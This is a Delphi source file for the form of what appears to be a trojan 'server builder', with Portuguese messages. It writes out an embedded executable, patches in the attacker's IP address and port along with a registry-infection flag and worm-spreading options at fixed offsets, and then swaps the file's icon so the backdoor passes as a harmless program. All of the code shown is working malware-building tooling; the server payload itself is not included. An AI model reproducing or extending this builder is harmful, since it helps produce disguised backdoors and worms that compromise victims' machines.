unit UCS;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, Spin;

type
  TFrmCriarServer = class(TForm)
    BtnCreate: TButton;
    GrpIcon: TGroupBox;
    ScrlbxIcones: TScrollBox;
    ImgICON01: TImage;
    ImgICON06: TImage;
    ImgICON02: TImage;
    ImgICON07: TImage;
    ImgICON03: TImage;
    ImgICON08: TImage;
    ImgICON04: TImage;
    ImgICON09: TImage;
    ImgICON05: TImage;
    ImgICON10: TImage;
    RbICON06: TRadioButton;
    RbICON07: TRadioButton;
    RbICON08: TRadioButton;
    RbICON09: TRadioButton;
    RbICON10: TRadioButton;
    RbICON01: TRadioButton;
    RbICON02: TRadioButton;
    RbICON03: TRadioButton;
    RbICON04: TRadioButton;
    RbICON05: TRadioButton;
    BtnOutro: TButton;
    Pnl: TPanel;
    DlgOpen: TOpenDialog;
    GrpServidor: TGroupBox;
    lblnome: TLabel;
    EdtNome: TEdit;
    edtip: TEdit;
    lblip: TLabel;
    LblPorta: TLabel;
    ImgIconeAtual: TImage;
    Pb: TProgressBar;
    ChkWormFunc: TCheckBox;
    ChkRegInfect: TCheckBox;
    PnlSize: TPanel;
    EdtSite: TEdit;
    EdtTxtWorm: TEdit;
    LblHomePage: TLabel;
    LblTxtWorm: TLabel;
    SePorta: TSpinEdit;
    procedure BtnCreateClick(Sender: TObject);
    procedure BtnOutroClick(Sender: TObject);
    procedure RbICON01Click(Sender: TObject);
    procedure EdtNomeKeyPress(Sender: TObject; var Key: Char);
    procedure ChkWormFuncClick(Sender: TObject);
    procedure EdtTxtWormKeyPress(Sender: TObject; var Key: Char);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmCriarServer: TFrmCriarServer;
  Caminho       : string;
  Flag          : Integer;

implementation

uses IconChanger;

{$R *.dfm}
{$R Resources\Server.res}
{$R Resources\Icons.res}

function CheckRButton(Frm: TForm): string;
 var
  i: Integer;
begin
  for i := 0 to (Frm.ComponentCount - 1) do
  begin
    if (Frm.Components[i] is TRadioButton) then
    begin
      if TRadioButton(Frm.Components[i]).Checked = True then
      begin
        Result := TRadioButton(Frm.Components[i]).Name;
        Exit;
      end;
    end;
  end;
end;

procedure ResourceLoadIcon(ResIconName: string);
 var
  Res : TResourceStream;
begin
  Res := TResourceStream.Create(HInstance, ResIconName, 'ICO' );
  try
    Res.SaveToFile(GetCurrentDir + '\ICON.ico');
  except
    Res.Free;
  end;
  Res.Free;
end;

function ResLoadImage(Instance: THandle; const ResName: string;
  ResType: PChar):TResourceStream;
begin
  Result := TResourceStream.Create(hInstance, ResName, ResType);
end;

function Writer_of_Strings(Address: DWORD; Size: Integer; Value, FileName: string): Boolean;
 var
  Mem : TMemoryStream;
  P   : Pointer;
begin
  Mem := TMemoryStream.Create;
  Mem.LoadFromFile(FileName);
  try
    Mem.Seek(Address, soFromBeginning);
    P := Pointer(Dword(Value));
    Mem.WriteBuffer(P^, Size);
    Mem.SaveToFile(FileName);
    Result := True;
  except
    Result := False;
    Mem.Free;
  end;
  Mem.Free;
end;

function Writer_of_Integer(Address, Value: DWORD; FileName : string): Boolean;
 var
  Mem: TMemoryStream;
begin
  Mem := TMemoryStream.Create;
  Mem.LoadFromFile(FileName);
  try
    Mem.Seek(Address,soFromBeginning);
    Mem.WriteBuffer(Value, SizeOf(Value));
    Mem.SaveToFile(FileName);
    Result := True;
  except
    Result := False;
    Mem.Free;
  end;
  Mem.Free;
end;

procedure TFrmCriarServer.BtnCreateClick(Sender: TObject);
 var
  Res: TResourceStream;
  ResFileError: Boolean;
  FileName: string;
begin
  ResFileError := False;
  FileName := GetCurrentDir + '\' + EdtNome.Text + '.exe';
  Res := TResourceStream.Create(HInstance, 'IDS', 'EXE');
  try
    Res.SaveToFile(FileName);
    pb.Position := 10;
  except
    ResFileError := True;
    Res.Free;
  end;
  Res.Free;
  pb.Position := 20;
  if not ResFileError then
  begin
    Writer_of_Strings($21B2C, 255, edtip.Text, FileName);
    Writer_of_Strings($21A2D, 255, EdtNome.Text, FileName);
    Writer_of_Integer($21C2C, SePorta.Value, FileName);

    Writer_of_Integer($21C30, Integer(ChkRegInfect.Checked), FileName);

    case ChkWormFunc.Checked of
      True  : begin
                Writer_of_Integer($21E34, 1, FileName);
                Writer_of_Strings($21D35, 255, edtsite.Text, FileName);
                Writer_of_Strings($21C35, 255, edttxtworm.Text, FileName);
              end;
      False : Writer_of_Integer($21E34, 0, FileName);
    end;
    pb.Position := 50;

    if (Boolean(Flag) = False) then
    begin
      Caminho := GetCurrentDir + '\ICON.ico';
      ResourceLoadIcon(Copy(CheckRButton(FrmCriarServer), 3, Length(CheckRButton(FrmCriarServer))));
    end;

    if UpdateApplicationIcon(PChar(Caminho), PChar(FileName)) then
    begin
      pb.Position := 100;
      MessageBox(
      Handle, 'O Arquivo Foi Criado Corretamente!', 'Informação', mb_OK
      + mb_defbutton1 + mb_ICONInformation);
    end else
      MessageBox(
      Handle, 'Ocorreu Um Erro na Troca de Ícone!', 'Erro', mb_OK
      + mb_defbutton1 + mb_ICONERROR);
  end else begin
    MessageBox(
    Handle, 'Ocorreu Um Erro na Criação do Arquivo!', 'Erro', mb_OK
    + mb_defbutton1 + mb_ICONERROR);
  end;
  pb.Position := 0;
  if FileExists(GetCurrentDir + '\ICON.ico') then
    DeleteFile(GetCurrentDir + '\ICON.ico');
end;

procedure TFrmCriarServer.BtnOutroClick(Sender: TObject);
begin
  if dlgOpen.Execute then
  begin
    Caminho := dlgOpen.FileName;
    imgiconeatual.Picture.LoadFromFile(dlgOpen.FileName);
    Flag := 1;
  end;
end;

procedure TFrmCriarServer.RbICON01Click(Sender: TObject);
begin
  imgiconeatual.Picture.Icon.LoadFromStream(ResLoadImage(HInstance,
  Copy(CheckRButton(FrmCriarServer), 3, Length(CheckRButton(FrmCriarServer))), 'ICO'));
  Flag := 0;
end;

procedure TFrmCriarServer.EdtNomeKeyPress(Sender: TObject; var Key: Char);
begin
  if (not ((Key in[#97..#122]) or (Key in[#65..#90]) or (Key in[#8]))) then
    Key := #0;
end;

procedure TFrmCriarServer.ChkWormFuncClick(Sender: TObject);
begin
  LblTxtWorm.Enabled := ChkWormFunc.Checked;
  LblHomePage.Enabled := ChkWormFunc.Checked;
  EdtSite.Enabled := ChkWormFunc.Checked;
  EdtTxtWorm.Enabled := ChkWormFunc.Checked;
end;

procedure TFrmCriarServer.EdtTxtWormKeyPress(Sender: TObject;
  var Key: Char);
begin
  if (not ((Key in[#97..#122]) or (Key in[#65..#90]) or (Key in[#8]) or (Key in[#32]))) then
    Key := #0;
end;

end.



